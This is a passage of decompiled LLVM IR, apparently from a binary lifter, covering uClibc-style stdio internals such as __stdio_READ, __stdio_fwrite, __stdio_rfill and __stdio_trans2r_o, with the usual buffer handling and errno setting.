  %v1_804f19f = call i32 @__errno_location(i32 %v0_804f173)
  %v1_804f1a4 = inttoptr i32 %v1_804f19f to i32*
  store i32 84, i32* %v1_804f1a4, align 4
  br label %dec_label_pc_804f1ed

dec_label_pc_804f1af:                             ; preds = %dec_label_pc_804f1ce
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804f1e2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f1de

dec_label_pc_804f1b3:                             ; preds = %dec_label_pc_804f18b
  %v2_804f1b3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f1b3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f1b7

dec_label_pc_804f1b7:                             ; preds = %dec_label_pc_804f196, %dec_label_pc_804f1b3
  %v2_804f1d016 = phi i32 [ %v2_804f196, %dec_label_pc_804f196 ], [ %v2_804f1b3, %dec_label_pc_804f1b3 ]
  %v1_804f1bc12 = phi i32 [ -1, %dec_label_pc_804f196 ], [ %arg4, %dec_label_pc_804f1b3 ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f1b9

dec_label_pc_804f1b9:                             ; preds = %dec_label_pc_804f18b, %dec_label_pc_804f1b7
  %v2_804f1d015 = phi i32 [ %v4_804f177, %dec_label_pc_804f18b ], [ %v2_804f1d016, %dec_label_pc_804f1b7 ]
  %v0_804f1be = phi i32 [ %arg4, %dec_label_pc_804f18b ], [ %v1_804f1bc12, %dec_label_pc_804f1b7 ]
  %v1_804f1b9 = inttoptr i32 %arg2 to i32*
  %v2_804f1b9 = load i32, i32* %v1_804f1b9, align 4
  store i32 %v2_804f1b9, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_804f1be, %arg3
  %v5_804f1c0 = select i1 %tmp31, i32 %arg3, i32 %v0_804f1be
  store i32 %v5_804f1c0, i32* %edi.global-to-local, align 4
  store i32 %v5_804f1c0, i32* @ecx, align 4
  %v1_804f1da3 = icmp eq i32 %v5_804f1c0, 0
  store i1 %v1_804f1da3, i1* %zf.global-to-local, align 1
  %v1_804f1dc10 = icmp eq i1 %v1_804f1da3, false
  br i1 %v1_804f1dc10, label %dec_label_pc_804f1c7, label %dec_label_pc_804f1de

dec_label_pc_804f1c7:                             ; preds = %dec_label_pc_804f1b9, %dec_label_pc_804f1d4
  %v2_804f1d0 = phi i32 [ %v2_804f1d7, %dec_label_pc_804f1d4 ], [ %v2_804f1d015, %dec_label_pc_804f1b9 ]
  %v0_804f1c7 = phi i32 [ %v1_804f1d4, %dec_label_pc_804f1d4 ], [ %v2_804f1b9, %dec_label_pc_804f1b9 ]
  %v1_804f1c7 = inttoptr i32 %v0_804f1c7 to i32*
  %v2_804f1c7 = load i32, i32* %v1_804f1c7, align 4
  %v9_804f1c9 = icmp eq i32 %v2_804f1c7, 127
  store i1 %v9_804f1c9, i1* %zf.global-to-local, align 1
  %v6_804f1cc = icmp ugt i32 %v2_804f1c7, 127
  br i1 %v6_804f1cc, label %dec_label_pc_804f19f, label %dec_label_pc_804f1ce

dec_label_pc_804f1ce:                             ; preds = %dec_label_pc_804f1c7
  %v3_804f1ce = trunc i32 %v2_804f1c7 to i8
  %v4_804f1ce = icmp eq i8 %v3_804f1ce, 0
  store i1 %v4_804f1ce, i1* %zf.global-to-local, align 1
  %v3_804f1d0 = inttoptr i32 %v2_804f1d0 to i8*
  store i8 %v3_804f1ce, i8* %v3_804f1d0, align 1
  %v0_804f1d2 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804f1d2, label %dec_label_pc_804f1af, label %dec_label_pc_804f1d4

dec_label_pc_804f1d4:                             ; preds = %dec_label_pc_804f1ce
  %v0_804f1d4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f1d4 = add i32 %v0_804f1d4, 4
  store i32 %v1_804f1d4, i32* %ebx.global-to-local, align 4
  %v0_804f1d7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f1d7 = load i32, i32* %esi.global-to-local, align 4
  %v2_804f1d7 = add i32 %v1_804f1d7, %v0_804f1d7
  store i32 %v2_804f1d7, i32* %edx.global-to-local, align 4
  %v0_804f1d9 = load i32, i32* @ecx, align 4
  %v1_804f1d9 = add i32 %v0_804f1d9, -1
  %v8_804f1d9 = icmp eq i32 %v1_804f1d9, 0
  store i32 %v1_804f1d9, i32* @ecx, align 4
  store i1 %v8_804f1d9, i1* %zf.global-to-local, align 1
  %v1_804f1dc = icmp eq i1 %v8_804f1d9, false
  br i1 %v1_804f1dc, label %dec_label_pc_804f1c7, label %dec_label_pc_804f1de

dec_label_pc_804f1de:                             ; preds = %dec_label_pc_804f1d4, %dec_label_pc_804f1b9, %dec_label_pc_804f1af
  %v0_804f1e6 = phi i32 [ 0, %dec_label_pc_804f1af ], [ %v2_804f1b9, %dec_label_pc_804f1b9 ], [ %v1_804f1d4, %dec_label_pc_804f1d4 ]
  %v0_804f1e2 = phi i32 [ %v0_804f1e2.pre, %dec_label_pc_804f1af ], [ %v2_804f1d015, %dec_label_pc_804f1b9 ], [ %v2_804f1d7, %dec_label_pc_804f1d4 ]
  %v2_804f1de = ptrtoint i32* %stack_var_-32 to i32
  %v12_804f1e2 = icmp eq i32 %v0_804f1e2, %v2_804f1de
  store i1 %v12_804f1e2, i1* %zf.global-to-local, align 1
  br i1 %v12_804f1e2, label %dec_label_pc_804f1e9, label %dec_label_pc_804f1e6

dec_label_pc_804f1e6:                             ; preds = %dec_label_pc_804f1de
  %v1_804f1e6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f1e6 = inttoptr i32 %v1_804f1e6 to i32*
  store i32 %v0_804f1e6, i32* %v2_804f1e6, align 4
  br label %dec_label_pc_804f1e9

dec_label_pc_804f1e9:                             ; preds = %dec_label_pc_804f1de, %dec_label_pc_804f1e6
  %v0_804f1e9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f1eb = load i32, i32* @ecx, align 4
  %v2_804f1eb = sub i32 %v0_804f1e9, %v1_804f1eb
  %v12_804f1eb = icmp eq i32 %v2_804f1eb, 0
  br label %dec_label_pc_804f1ed

dec_label_pc_804f1ed:                             ; preds = %dec_label_pc_804f19f, %dec_label_pc_804f1e9
  %storemerge = phi i1 [ %v12_804f1eb, %dec_label_pc_804f1e9 ], [ false, %dec_label_pc_804f19f ]
  %storemerge1 = phi i32 [ %v2_804f1eb, %dec_label_pc_804f1e9 ], [ -1, %dec_label_pc_804f19f ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_804f1ed = load i32, i32* @esp, align 4
  %v9_804f1ed = icmp eq i32 %v0_804f1ed, -28
  store i1 %v9_804f1ed, i1* %zf.global-to-local, align 1
  store i32 %v0_804f173, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_804f1e2, { 1, 0 }
  uselistorder i32 %v2_804f1d7, { 0, 2, 1 }
  uselistorder i32 %v1_804f1d4, { 0, 2, 1 }
  uselistorder i32 %v2_804f1c7, { 1, 2, 0 }
  uselistorder i32 %v2_804f1b9, { 1, 0, 2 }
  uselistorder i32 %v0_804f1be, { 1, 0 }
  uselistorder i32 %v2_804f1d015, { 1, 0 }
  uselistorder i1 %v12_804f18b, { 1, 0 }
  uselistorder i32 %v4_804f177, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 0, 12, 1, 6, 3, 4, 5, 11, 7, 2, 8, 9, 10 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 -28, { 0, 2, 1 }
  uselistorder i32 127, { 2, 0, 5, 1, 4, 3 }
  uselistorder i1 true, { 2, 3, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 84, { 3, 4, 0, 5, 1, 2 }
  uselistorder i8* null, { 5, 4, 6, 3, 2, 8, 0, 1, 7, 9, 10 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f1ed, { 1, 0 }
  uselistorder label %dec_label_pc_804f1e9, { 1, 0 }
  uselistorder label %dec_label_pc_804f1c7, { 1, 0 }
  uselistorder label %dec_label_pc_804f1b9, { 1, 0 }
  uselistorder label %dec_label_pc_804f1b7, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f1f8 = load i32, i32* @ebx, align 4
  store i32 %v0_804f1f8, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_804f1fe = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f1fe, i32* @ebx, align 4
  %v1_804f206 = bitcast i16* %arg1 to i8*
  %v2_804f206 = load i8, i8* %v1_804f206, align 1
  %v3_804f206 = and i8 %v2_804f206, 4
  %v4_804f206 = icmp eq i8 %v3_804f206, 0
  %v1_804f209 = icmp eq i1 %v4_804f206, false
  br i1 %v1_804f209, label %dec_label_pc_804f241, label %dec_label_pc_804f20b

dec_label_pc_804f20b:                             ; preds = %entry
  %v2_804f20b = icmp slt i32 %arg3, 0
  %v3_804f212 = select i1 %v2_804f20b, i32 2147483647, i32 %arg3
  %v1_804f21b = add i32 %v4_804f1fe, 4
  %v2_804f21b = inttoptr i32 %v1_804f21b to i32*
  %v3_804f21b = load i32, i32* %v2_804f21b, align 4
  %v4_804f21e = inttoptr i32 %arg2 to i32*
  %v5_804f21e = call i32 @__libc_read(i32 %v3_804f21b, i32* %v4_804f21e, i32 %v3_804f212, i32 2147483647)
  store i32 %v5_804f21e, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v5_804f21e, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_804f241, label %dec_label_pc_804f22d

dec_label_pc_804f22d:                             ; preds = %dec_label_pc_804f20b
  %v1_804f226 = icmp eq i32 %v5_804f21e, 0
  %v4_804f22b = icmp eq i1 %v1_804f226, false
  %v0_804f22d = load i32, i32* @ebx, align 4
  %v1_804f22d = inttoptr i32 %v0_804f22d to i32*
  %v2_804f22d = load i32, i32* %v1_804f22d, align 4
  br i1 %v4_804f22b, label %dec_label_pc_804f239, label %dec_label_pc_804f231

dec_label_pc_804f231:                             ; preds = %dec_label_pc_804f22d
  %v1_804f231 = or i32 %v2_804f22d, 4
  %v1_804f234 = trunc i32 %v1_804f231 to i16
  %v3_804f234 = inttoptr i32 %v0_804f22d to i16*
  store i16 %v1_804f234, i16* %v3_804f234, align 2
  br label %dec_label_pc_804f241

dec_label_pc_804f239:                             ; preds = %dec_label_pc_804f22d
  %v1_804f239 = or i32 %v2_804f22d, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804f23e = trunc i32 %v1_804f239 to i16
  %v3_804f23e = inttoptr i32 %v0_804f22d to i16*
  store i16 %v1_804f23e, i16* %v3_804f23e, align 2
  br label %dec_label_pc_804f241

dec_label_pc_804f241:                             ; preds = %entry, %dec_label_pc_804f20b, %dec_label_pc_804f231, %dec_label_pc_804f239
  %v0_804f242 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f245 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f245, i32* @ebx, align 4
  ret i32 %v0_804f242

; uselistorder directives
  uselistorder i32 %v5_804f21e, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32 2147483647, { 0, 3, 1, 2, 4 }
  uselistorder i8 4, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f241, { 3, 2, 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f248 = load i32, i32* @ebp, align 4
  %v0_804f249 = load i32, i32* @edi, align 4
  %v0_804f24a = load i32, i32* @esi, align 4
  %v0_804f24b = load i32, i32* @ebx, align 4
  store i32 %v0_804f24b, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_804f25b = add i32 %arg3, 1
  %v2_804f25b = inttoptr i32 %v1_804f25b to i8*
  %v3_804f25b = load i8, i8* %v2_804f25b, align 1
  %v4_804f25b = and i8 %v3_804f25b, 2
  %v5_804f25b = icmp eq i8 %v4_804f25b, 0
  %v1_804f25f = icmp eq i1 %v5_804f25b, false
  br i1 %v1_804f25f, label %dec_label_pc_804f310, label %dec_label_pc_804f265

dec_label_pc_804f265:                             ; preds = %entry
  %v1_804f265 = add i32 %arg3, 4
  %v2_804f265 = inttoptr i32 %v1_804f265 to i32*
  %v3_804f265 = load i32, i32* %v2_804f265, align 4
  %v13_804f265 = icmp eq i32 %v3_804f265, -2
  %v1_804f269 = add i32 %arg3, 16
  %v2_804f269 = inttoptr i32 %v1_804f269 to i32*
  %v3_804f269 = load i32, i32* %v2_804f269, align 4
  store i32 %v3_804f269, i32* @edx, align 4
  %v1_804f26c = add i32 %arg3, 12
  %v2_804f26c = inttoptr i32 %v1_804f26c to i32*
  %v3_804f26c = load i32, i32* %v2_804f26c, align 4
  store i32 %v3_804f26c, i32* %eax.global-to-local, align 4
  %v1_804f26f = icmp eq i1 %v13_804f265, false
  %v2_804f28e = sub i32 %v3_804f26c, %v3_804f269
  br i1 %v1_804f26f, label %dec_label_pc_804f28e, label %dec_label_pc_804f271

dec_label_pc_804f271:                             ; preds = %dec_label_pc_804f265
  %tmp = icmp uge i32 %v2_804f28e, %arg2
  %v5_804f278 = select i1 %tmp, i32 %arg2, i32 %v2_804f28e
  store i32 %v5_804f278, i32* %ebx.global-to-local, align 4
  %v3_804f27e = inttoptr i32 %v3_804f269 to i16*
  %v4_804f27e = call i32 @memcpy(i16* %v3_804f27e, i32 %v5_804f278, i32 %v3_804f26c)
  store i32 %v4_804f27e, i32* %eax.global-to-local, align 4
  %v0_804f286 = load i32, i32* @esi, align 4
  %v1_804f286 = add i32 %v0_804f286, 16
  %v2_804f286 = inttoptr i32 %v1_804f286 to i32*
  %v3_804f286 = load i32, i32* %v2_804f286, align 4
  %v4_804f286 = load i32, i32* %ebx.global-to-local, align 4
  %v5_804f286 = add i32 %v4_804f286, %v3_804f286
  store i32 %v5_804f286, i32* %v2_804f286, align 4
  br label %dec_label_pc_804f328

dec_label_pc_804f28e:                             ; preds = %dec_label_pc_804f265
  store i32 %v2_804f28e, i32* %eax.global-to-local, align 4
  %v6_804f292 = icmp ult i32 %v2_804f28e, %arg2
  br i1 %v6_804f292, label %dec_label_pc_804f2f7, label %dec_label_pc_804f294

dec_label_pc_804f294:                             ; preds = %dec_label_pc_804f28e
  %v0_804f294 = load i32, i32* @ecx, align 4
  %v3_804f298 = inttoptr i32 %v3_804f269 to i16*
  %v4_804f298 = call i32 @memcpy(i16* %v3_804f298, i32 %arg2, i32 %v0_804f294)
  store i32 %v4_804f298, i32* %eax.global-to-local, align 4
  %v0_804f2a0 = load i32, i32* @esi, align 4
  %v1_804f2a0 = add i32 %v0_804f2a0, 16
  %v2_804f2a0 = inttoptr i32 %v1_804f2a0 to i32*
  %v3_804f2a0 = load i32, i32* %v2_804f2a0, align 4
  %v4_804f2a0 = load i32, i32* @edi, align 4
  %v5_804f2a0 = add i32 %v4_804f2a0, %v3_804f2a0
  store i32 %v5_804f2a0, i32* %v2_804f2a0, align 4
  %v0_804f2a3 = load i32, i32* @esi, align 4
  %v1_804f2a3 = add i32 %v0_804f2a3, 1
  %v2_804f2a3 = inttoptr i32 %v1_804f2a3 to i8*
  %v3_804f2a3 = load i8, i8* %v2_804f2a3, align 1
  %v4_804f2a3 = urem i8 %v3_804f2a3, 2
  %v5_804f2a3 = icmp eq i8 %v4_804f2a3, 0
  br i1 %v5_804f2a3, label %dec_label_pc_804f328, label %dec_label_pc_804f2a9

dec_label_pc_804f2a9:                             ; preds = %dec_label_pc_804f294
  %v0_804f2a9 = load i32, i32* @edx, align 4
  %v0_804f2aa = load i32, i32* @edi, align 4
  %v4_804f2ae = call i32 @memrchr(i8 10, i32 %v0_804f2aa, i32 %v0_804f2a9)
  store i32 %v4_804f2ae, i32* %eax.global-to-local, align 4
  %v1_804f2b6 = icmp eq i32 %v4_804f2ae, 0
  br i1 %v1_804f2b6, label %dec_label_pc_804f328, label %dec_label_pc_804f2ba

dec_label_pc_804f2ba:                             ; preds = %dec_label_pc_804f2a9
  %v0_804f2bd = load i32, i32* @esi, align 4
  %v1_804f2be = call i32 @__stdio_wcommit(i32 %v0_804f2bd)
  store i32 %v1_804f2be, i32* %eax.global-to-local, align 4
  %v1_804f2c6 = icmp eq i32 %v1_804f2be, 0
  br i1 %v1_804f2c6, label %dec_label_pc_804f328, label %dec_label_pc_804f2ca

dec_label_pc_804f2ca:                             ; preds = %dec_label_pc_804f2ba
  %v0_804f2ca = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_804f2ca, %v1_804f2be
  %v5_804f2ce = select i1 %tmp20, i32 %v0_804f2ca, i32 %v1_804f2be
  store i32 %v5_804f2ce, i32* %ebx.global-to-local, align 4
  %v2_804f2d3 = sub i32 %v0_804f2ca, %v5_804f2ce
  store i32 %v2_804f2d3, i32* %eax.global-to-local, align 4
  %v0_804f2d5 = load i32, i32* @ebp, align 4
  %v2_804f2d5 = add i32 %v0_804f2d5, %v2_804f2d3
  store i32 %v2_804f2d5, i32* %ebp.global-to-local, align 4
  %v4_804f2dc = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_804f2ce, i32 %v2_804f2d3)
  store i32 %v4_804f2dc, i32* %eax.global-to-local, align 4
  %v1_804f2e4 = icmp eq i32 %v4_804f2dc, 0
  store i32 %v4_804f2dc, i32* @edx, align 4
  br i1 %v1_804f2e4, label %dec_label_pc_804f328, label %dec_label_pc_804f2ea

dec_label_pc_804f2ea:                             ; preds = %dec_label_pc_804f2ca
  %v0_804f2ea = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f2ea = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f2ea = sub i32 %v0_804f2ea, %v4_804f2dc
  %v2_804f2ee = add i32 %v2_804f2ea, %v1_804f2ea
  store i32 %v2_804f2ee, i32* %eax.global-to-local, align 4
  %v0_804f2f0 = load i32, i32* @esi, align 4
  %v1_804f2f0 = add i32 %v0_804f2f0, 16
  %v2_804f2f0 = inttoptr i32 %v1_804f2f0 to i32*
  %v3_804f2f0 = load i32, i32* %v2_804f2f0, align 4
  %v5_804f2f0 = sub i32 %v3_804f2f0, %v2_804f2ee
  store i32 %v5_804f2f0, i32* %v2_804f2f0, align 4
  %v0_804f2f3 = load i32, i32* @edi, align 4
  %v1_804f2f3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f2f3 = sub i32 %v0_804f2f3, %v1_804f2f3
  store i32 %v2_804f2f3, i32* @edi, align 4
  br label %dec_label_pc_804f328

dec_label_pc_804f2f7:                             ; preds = %dec_label_pc_804f28e
  %v2_804f2f7 = add i32 %arg3, 8
  %v3_804f2f7 = inttoptr i32 %v2_804f2f7 to i32*
  %v4_804f2f7 = load i32, i32* %v3_804f2f7, align 4
  %v15_804f2f7 = icmp eq i32 %v3_804f269, %v4_804f2f7
  br i1 %v15_804f2f7, label %dec_label_pc_804f310, label %dec_label_pc_804f2fc

dec_label_pc_804f2fc:                             ; preds = %dec_label_pc_804f2f7
  %v1_804f300 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_804f300, i32* %eax.global-to-local, align 4
  %v1_804f308 = icmp eq i32 %v1_804f300, 0
  br i1 %v1_804f308, label %dec_label_pc_804f2fc.dec_label_pc_804f310_crit_edge, label %dec_label_pc_804f30c

dec_label_pc_804f2fc.dec_label_pc_804f310_crit_edge: ; preds = %dec_label_pc_804f2fc
  %v0_804f310.pre = load i32, i32* @edi, align 4
  %v0_804f318.pre = load i32, i32* @esi, align 4
  %v2_804f31f.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804f310

dec_label_pc_804f30c:                             ; preds = %dec_label_pc_804f2fc
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804f328

dec_label_pc_804f310:                             ; preds = %dec_label_pc_804f2fc.dec_label_pc_804f310_crit_edge, %dec_label_pc_804f2f7, %entry
  %v2_804f31f = phi i32 [ %v2_804f31f.pre, %dec_label_pc_804f2fc.dec_label_pc_804f310_crit_edge ], [ %v0_804f24b, %dec_label_pc_804f2f7 ], [ %v0_804f24b, %entry ]
  %v0_804f318 = phi i32 [ %v0_804f318.pre, %dec_label_pc_804f2fc.dec_label_pc_804f310_crit_edge ], [ %arg3, %dec_label_pc_804f2f7 ], [ %arg3, %entry ]
  %v0_804f310 = phi i32 [ %v0_804f310.pre, %dec_label_pc_804f2fc.dec_label_pc_804f310_crit_edge ], [ %arg2, %dec_label_pc_804f2f7 ], [ %arg2, %entry ]
  store i32 %v2_804f31f, i32* @ebx, align 4
  store i32 %v0_804f249, i32* @edi, align 4
  %v4_804f323 = inttoptr i32 %v0_804f318 to i16*
  %v5_804f323 = call i32 @__stdio_WRITE(i16* %v4_804f323, i32 %v0_804f310, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804f323, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f328

dec_label_pc_804f328:                             ; preds = %dec_label_pc_804f2ca, %dec_label_pc_804f2ba, %dec_label_pc_804f2a9, %dec_label_pc_804f294, %dec_label_pc_804f30c, %dec_label_pc_804f2ea, %dec_label_pc_804f271, %dec_label_pc_804f310
  %v0_804f32b = load i32, i32* @edi, align 4
  store i32 %v0_804f32b, i32* %eax.global-to-local, align 4
  %v2_804f32d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f32d, i32* @ebx, align 4
  store i32 %v0_804f24a, i32* @esi, align 4
  store i32 %v0_804f249, i32* @edi, align 4
  store i32 %v0_804f248, i32* @ebp, align 4
  ret i32 %v0_804f32b

; uselistorder directives
  uselistorder i32 %v2_804f2ee, { 1, 0 }
  uselistorder i32 %v0_804f2ca, { 2, 1, 0 }
  uselistorder i32 %v1_804f2be, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804f28e, { 2, 3, 1, 0 }
  uselistorder i32 %v3_804f269, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_804f249, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 31, 32, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i8 10, { 11, 12, 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 0, 1, 5, 6, 2, 3, 13, 4, 7, 8, 9, 14, 10, 11, 15, 16, 17, 12 }
  uselistorder i8 2, { 5, 13, 6, 1, 2, 3, 4, 0, 17, 14, 7, 8, 9, 10, 11, 15, 16, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_804f328, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_804f334 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f33c = add i32 %arg1, 8
  %v2_804f33c = inttoptr i32 %v1_804f33c to i32*
  %v3_804f33c = load i32, i32* %v2_804f33c, align 4
  store i32 %v3_804f33c, i32* %edx.global-to-local, align 4
  %v1_804f33f = add i32 %arg1, 12
  %v2_804f33f = inttoptr i32 %v1_804f33f to i32*
  %v3_804f33f = load i32, i32* %v2_804f33f, align 4
  %v2_804f342 = sub i32 %v3_804f33f, %v3_804f33c
  %v3_804f347 = inttoptr i32 %arg1 to i16*
  %v4_804f347 = call i32 @__stdio_READ(i16* %v3_804f347, i32 %v3_804f33c, i32 %v2_804f342)
  %v0_804f34c = load i32, i32* @ebx, align 4
  %v1_804f34c = add i32 %v0_804f34c, 8
  %v2_804f34c = inttoptr i32 %v1_804f34c to i32*
  %v3_804f34c = load i32, i32* %v2_804f34c, align 4
  store i32 %v3_804f34c, i32* %edx.global-to-local, align 4
  %v2_804f34f = add i32 %v0_804f34c, 16
  %v3_804f34f = inttoptr i32 %v2_804f34f to i32*
  store i32 %v3_804f34c, i32* %v3_804f34f, align 4
  %v0_804f352 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f352 = add i32 %v0_804f352, %v4_804f347
  store i32 %v2_804f352, i32* %edx.global-to-local, align 4
  %v1_804f354 = load i32, i32* @ebx, align 4
  %v2_804f354 = add i32 %v1_804f354, 20
  %v3_804f354 = inttoptr i32 %v2_804f354 to i32*
  store i32 %v2_804f352, i32* %v3_804f354, align 4
  store i32 %v0_804f334, i32* @ebx, align 4
  ret i32 %v4_804f347

; uselistorder directives
  uselistorder i32 %v4_804f347, { 1, 0 }
  uselistorder i32 (i16*, i32, i32)* @__stdio_READ, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804f35c = load i32, i32* @ebx, align 4
  %v4_804f360 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f360, i32* @ebx, align 4
  %v2_804f368 = load i16, i16* %arg1, align 2
  %v3_804f368 = zext i16 %v2_804f368 to i32
  %v2_804f36b = and i32 %v3_804f368, %arg2
  %v3_804f36b = icmp eq i32 %v2_804f36b, 0
  %v1_804f36d = icmp eq i1 %v3_804f36b, false
  br i1 %v1_804f36d, label %dec_label_pc_804f37b, label %dec_label_pc_804f36f

dec_label_pc_804f36f:                             ; preds = %entry
  %v1_804f36f = and i32 %v3_804f368, 2176
  %v2_804f36f = icmp eq i32 %v1_804f36f, 0
  %v1_804f374 = icmp eq i1 %v2_804f36f, false
  br i1 %v1_804f374, label %dec_label_pc_804f382, label %dec_label_pc_804f376

dec_label_pc_804f376:                             ; preds = %dec_label_pc_804f36f
  %v2_804f376 = or i32 %v3_804f368, %arg2
  %v1_804f378 = trunc i32 %v2_804f376 to i16
  store i16 %v1_804f378, i16* %arg1, align 2
  %v0_804f37b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f37b

dec_label_pc_804f37b:                             ; preds = %entry, %dec_label_pc_804f376
  %v0_804f3a1 = phi i32 [ %v4_804f360, %entry ], [ %v0_804f37b.pre, %dec_label_pc_804f376 ]
  %v1_804f37b = inttoptr i32 %v0_804f3a1 to i16*
  %v2_804f37b = load i16, i16* %v1_804f37b, align 2
  %v2_804f37e = and i16 %v2_804f37b, 16
  %v3_804f37e = icmp eq i16 %v2_804f37e, 0
  br i1 %v3_804f37e, label %dec_label_pc_804f39a, label %dec_label_pc_804f382

dec_label_pc_804f382:                             ; preds = %dec_label_pc_804f37b, %dec_label_pc_804f36f
  %v1_804f382 = call i32 @__errno_location(i32 %v0_804f35c)
  %v1_804f387 = inttoptr i32 %v1_804f382 to i32*
  store i32 9, i32* %v1_804f387, align 4
  br label %dec_label_pc_804f38d

dec_label_pc_804f38d:                             ; preds = %dec_label_pc_804f39e, %dec_label_pc_804f382
  %v0_804f38d = load i32, i32* @ebx, align 4
  %v1_804f38d = inttoptr i32 %v0_804f38d to i32*
  %v2_804f38d = load i32, i32* %v1_804f38d, align 4
  %v1_804f38f = or i32 %v2_804f38d, 8
  %v1_804f392 = trunc i32 %v1_804f38f to i16
  %v3_804f392 = inttoptr i32 %v0_804f38d to i16*
  store i16 %v1_804f392, i16* %v3_804f392, align 2
  br label %dec_label_pc_804f3c6

dec_label_pc_804f39a:                             ; preds = %dec_label_pc_804f37b
  %v2_804f39a = and i16 %v2_804f37b, 64
  %v3_804f39a = icmp eq i16 %v2_804f39a, 0
  br i1 %v3_804f39a, label %dec_label_pc_804f3bc, label %dec_label_pc_804f39e

dec_label_pc_804f39e:                             ; preds = %dec_label_pc_804f39a
  %v2_804f3a2 = call i32 @__stdio_wcommit(i32 %v0_804f3a1)
  %v1_804f3aa = icmp eq i32 %v2_804f3a2, 0
  %v1_804f3ac = icmp eq i1 %v1_804f3aa, false
  br i1 %v1_804f3ac, label %dec_label_pc_804f38d, label %dec_label_pc_804f3ae

dec_label_pc_804f3ae:                             ; preds = %dec_label_pc_804f39e
  %v0_804f3ae = load i32, i32* @ebx, align 4
  %v1_804f3ae = add i32 %v0_804f3ae, 8
  %v2_804f3ae = inttoptr i32 %v1_804f3ae to i32*
  %v3_804f3ae = load i32, i32* %v2_804f3ae, align 4
  %v2_804f3b1 = add i32 %v0_804f3ae, 28
  %v3_804f3b1 = inttoptr i32 %v2_804f3b1 to i32*
